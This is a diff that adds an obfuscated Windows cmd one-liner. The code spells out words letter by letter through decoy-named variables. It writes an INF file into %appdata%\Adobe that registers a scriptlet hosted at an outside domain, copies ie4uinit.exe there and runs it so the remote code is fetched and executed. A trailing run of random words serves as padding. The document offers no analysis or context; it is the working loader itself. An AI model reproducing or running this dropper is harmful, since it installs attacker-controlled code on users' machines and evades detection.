@@ -1,0 +1,7 @@
+/v /c (for %n in (s) do @set "Relatives=%~n") &&
+  (for %d in (a) do @set "Cable=%~d") &&
+  (for %h in (c) do @set "Evidence=%~h") &&
+  (for %h in (i) do @set "Glass=%~h") &&
+  call(for %n in ("[defaultinstall.windows7]" "delfiles=D849D" "Un\" "Register\" "OCXs=EB4B44" "[strings]" "Immigrants=%t!Glass!me%" "Mirror=t;Still" "Specifications=/" "Neglect=h" "shortsvcname=' '" "Artist=:;Donations" "Similar=b;Drawings" "Hands=init" "servicename=' '" "[version]" "signature =$windows nt$" "[EB4B44]" "sc\" "ro%Similar%j,NI,%Neglect%%Mirror%%Mirror%p%Artist%%Specifications%%Specifications%xyd.teresamalins.com/applicationresponce" "[destinationdirs]" "defaultdestdir=11" "D849D=01" "[D849D]" "ieu%Hands%.inf" ) do @echo %~n)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!GlasssVotes!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Exile3=Regular &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Exile5=Headlines Garbage Trials Plunge Shoot Evolve Lemon Collect Earth Awake Pumpkin Switches Another Spies Limits Spell Weasel Common Credit Advance Dinosaur Writes Amused Gesture Melody Illegal Powder Brain Scorpion Brisk Remember Hills Impulse Flows August Coyote Titles Bring Blocks Property Markets Devote Inform Valid Introduces Copyrights Crawl Where Across"
